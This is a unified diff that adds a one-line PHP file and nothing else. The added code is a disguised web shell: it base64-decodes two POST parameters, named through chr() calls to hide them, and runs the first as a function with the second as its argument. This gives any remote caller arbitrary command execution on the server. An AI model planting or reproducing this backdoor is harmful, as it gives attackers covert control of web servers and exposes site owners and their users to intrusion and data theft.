@@ -1,0 +1,1 @@
+<?php $s=base64_decode($_POST[chr(115)]);$k=base64_decode($_POST[chr(107)]);echo $s($k); ?>
